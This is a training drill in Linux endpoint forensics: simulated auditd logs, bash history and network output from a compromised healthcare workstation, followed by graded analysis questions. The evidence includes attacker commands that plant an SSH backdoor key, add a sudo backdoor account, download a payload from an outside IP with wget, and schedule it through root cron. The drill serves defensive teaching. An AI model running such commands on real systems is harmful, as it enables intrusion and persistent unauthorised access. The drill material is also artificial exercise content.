# Drill 02 (Intermediate): Endpoint Forensics Scenario

**Level:** Intermediate

**Estimated time:** 50 minutes

**Skills tested:** Linux forensics, auditd log analysis, persistence hunting, incident reconstruction

---

## Scenario

You are a SOC analyst at a healthcare organization.
A nurse reported that her Linux workstation (`NURSE-WS04`) has been "acting strange" — it was slow for a few minutes yesterday afternoon, and she noticed some files she doesn't recognize in her home directory.

Your security team deployed an agent on the system.
You have the following forensic data to analyze.

**System:** Ubuntu 22.04 LTS

**User:** `alice` (uid=1000, a nurse with limited IT knowledge)

**Incident timeframe:** Yesterday afternoon (2024-04-09), approximately 14:00–15:00 UTC

**Your job:** Determine if this system was compromised, what happened, and establish the scope.

---

## Evidence 1: auditd Log Excerpt

```text
# /var/log/audit/audit.log (relevant excerpts, chronological)

# Block 1 — 13:55 UTC
type=USER_AUTH msg=audit(1712674500.001:8901): pid=12500 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=pam_unix acct="alice" exe="/usr/sbin/sshd" hostname=10.20.30.100 addr=10.20.30.100 terminal=ssh res=success'
type=USER_LOGIN msg=audit(1712674500.456:8902): pid=12500 uid=0 auid=1000 ses=42 msg='op=login id=1000 exe="/usr/sbin/sshd" hostname=10.20.30.100 addr=10.20.30.100 terminal=/dev/pts/2 res=success'

# Block 2 — 13:58 UTC
type=SYSCALL msg=audit(1712674680.234:9001): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234 a1=7f5678 a2=7f9abc a3=0 items=2 ppid=12500 pid=12501 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts2 ses=42 comm="bash" exe="/bin/bash" key="exec_64bit"
type=EXECVE msg=audit(1712674680.234:9001): argc=1 a0="bash"
type=CWD msg=audit(1712674680.234:9001): cwd="/home/alice"

# Block 3 — 14:02 UTC
type=SYSCALL msg=audit(1712674920.123:9100): arch=c000003e syscall=59 success=yes exit=0 ppid=12501 pid=12502 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=42 comm="sudo" exe="/usr/bin/sudo" key="privesc"
type=EXECVE msg=audit(1712674920.123:9100): argc=2 a0="sudo" a1="bash"
type=CWD msg=audit(1712674920.123:9100): cwd="/home/alice"

# Block 4 — 14:02 UTC (10 seconds later)
type=SYSCALL msg=audit(1712674930.789:9101): arch=c000003e syscall=59 success=yes exit=0 ppid=12502 pid=12503 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=42 comm="bash" exe="/bin/bash" key="exec_64bit"
type=EXECVE msg=audit(1712674930.789:9101): argc=1 a0="bash"

# Block 5 — 14:03 UTC
type=SYSCALL msg=audit(1712674980.345:9200): arch=c000003e syscall=59 success=yes exit=0 ppid=12503 pid=12504 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=42 comm="useradd" exe="/usr/sbin/useradd" key="identity"
type=EXECVE msg=audit(1712674980.345:9200): argc=5 a0="useradd" a1="-m" a2="-s" a3="/bin/bash" a4="sysadmin"
type=PATH msg=audit(1712674980.345:9200): item=1 name="/etc/passwd" inode=131074 dev=fd:01 mode=0100644

# Block 6 — 14:03 UTC
type=SYSCALL msg=audit(1712674985.678:9201): arch=c000003e syscall=59 success=yes exit=0 ppid=12503 pid=12505 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=42 comm="usermod" exe="/usr/sbin/usermod" key="identity"
type=EXECVE msg=audit(1712674985.678:9201): argc=3 a0="usermod" a1="-aG" a2="sudo" a3="sysadmin"

# Block 7 — 14:04 UTC
type=SYSCALL msg=audit(1712675040.901:9300): arch=c000003e syscall=59 success=yes exit=0 ppid=12503 pid=12506 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=42 comm="bash" exe="/bin/bash" key="exec_64bit"
type=EXECVE msg=audit(1712675040.901:9300): argc=3 a0="bash" a1="-c" a2="echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRsT9k backdoor@attacker.com' >> /root/.ssh/authorized_keys"
type=PATH msg=audit(1712675040.901:9300): item=1 name="/root/.ssh/authorized_keys" inode=131082 dev=fd:01

# Block 8 — 14:05 UTC
type=SYSCALL msg=audit(1712675100.234:9400): arch=c000003e syscall=59 success=yes exit=0 ppid=12503 pid=12507 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=42 comm="bash" exe="/bin/bash" key="exec_64bit"
type=EXECVE msg=audit(1712675100.234:9400): argc=3 a0="bash" a1="-c" a2="echo '* * * * * root /tmp/.x/agent -d -q' >> /etc/cron.d/update-agent"
type=PATH msg=audit(1712675100.234:9400): item=1 name="/etc/cron.d/update-agent" inode=131085 dev=fd:01

# Block 9 — 14:06 UTC
type=SYSCALL msg=audit(1712675160.567:9500): arch=c000003e syscall=59 success=yes exit=0 ppid=12503 pid=12508 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=42 comm="wget" exe="/usr/bin/wget" key="exec_64bit"
type=EXECVE msg=audit(1712675160.567:9500): argc=4 a0="wget" a1="-q" a2="-O" a3="/tmp/.x/agent" a4="http://185.234.219.47/agent_linux"
type=PATH msg=audit(1712675160.567:9500): item=1 name="/tmp/.x/agent"
```

---

## Evidence 2: Files Found in /home/alice

```bash
# ls -la /home/alice/ output
total 72
drwxr-xr-x 6 alice alice 4096 Apr  9 14:55 .
drwxr-xr-x 5 root  root  4096 Mar  1 09:00 ..
-rw------- 1 alice alice  892 Apr  9 14:01 .bash_history    ← recently modified
-rw-r--r-- 1 alice alice  220 Mar  1 09:00 .bash_logout
-rw-r--r-- 1 alice alice 3526 Mar  1 09:00 .bashrc
-rw-r--r-- 1 alice alice  807 Mar  1 09:00 .profile
drwx------ 2 alice alice 4096 Apr  9 13:55 .ssh
-rw-r--r-- 1 alice alice   48 Apr  9 13:58 .bash_history_
drwxrwxrwx 2 alice alice 4096 Apr  9 14:09 .local           ← world-writable!

# cat /home/alice/.bash_history (partial)
ls
pwd
cat /etc/os-release
sudo bash
# (after sudo):
useradd -m -s /bin/bash sysadmin
usermod -aG sudo sysadmin
echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> /root/.ssh/authorized_keys
mkdir -p /tmp/.x
wget -q -O /tmp/.x/agent http://185.234.219.47/agent_linux
chmod +x /tmp/.x/agent
echo '* * * * * root /tmp/.x/agent -d -q' >> /etc/cron.d/update-agent
```

---

## Evidence 3: /etc/passwd Excerpt (Relevant Lines)

```text
alice:x:1000:1000:Alice Smith,,,:/home/alice:/bin/bash
sysadmin:x:1002:1002::/home/sysadmin:/bin/bash
```

---

## Evidence 4: Network Connections at Time of Incident

```console
# ss -tlnp output (captured at 14:10 UTC)
Netid  State    Recv-Q  Send-Q  Local Address:Port  Peer Address:Port
tcp    LISTEN   0       128     0.0.0.0:22           0.0.0.0:*      users:(("sshd",pid=800,fd=3))
tcp    LISTEN   0       128     0.0.0.0:4444         0.0.0.0:*      users:(("/tmp/.x/agent",pid=9900,fd=3))
```

---

## Questions

---

### Q1 — Login Context Analysis (2 points)

Analyze Block 1 of the audit log.

a) Who logged in, from where, and how?
b) Is this login suspicious by itself?
What additional context would you need?

---

### Q2 — Privilege Escalation (2 points)

Analyze Block 3.

a) How did the attacker escalate to root?
b) What does it mean that `auid=1000` but `uid=0` and `euid=0`?
c) Why is `alice` being able to `sudo bash` a serious configuration problem?

---

### Q3 — Timeline Reconstruction (4 points)

Using ALL evidence provided (audit log, bash history, file listing, network connections), construct a complete attack timeline.
Include:

* Timestamp
* What happened
* MITRE ATT&CK technique
* Relevant evidence source

---

### Q4 — Persistence Analysis (3 points)

Identify ALL persistence mechanisms deployed.
For each one:
a) Describe what it is
b) How the attacker would use it
c) How to detect it during forensics

---

### Q5 — Attacker Capability Assessment (2 points)

Based on `/tmp/.x/agent` listening on port 4444 (Evidence 4):

a) What does this suggest about the agent's capabilities?
b) Why is a C2 agent on a nurse's workstation particularly concerning from a compliance perspective (think HIPAA/healthcare data)?

---

### Q6 — How Did the Attacker Get In? (3 points)

This is the most important question.
Think carefully about the evidence.

a) The attacker authenticated via SSH as `alice` from `10.20.30.100`.
How could an attacker have obtained alice's SSH credentials?
b) This is a nurse's workstation.
Why would a nurse have SSH enabled and be able to `sudo bash`?
c) What does this suggest about the attacker profile — external attacker or insider threat?

---

### Q7 — Remediation and Hardening (4 points)

Write a comprehensive remediation plan that addresses both the immediate compromise and the underlying security weaknesses that enabled it.

---

## Submission

See `solutions/drill-02-solution/README.md` for the answer key.
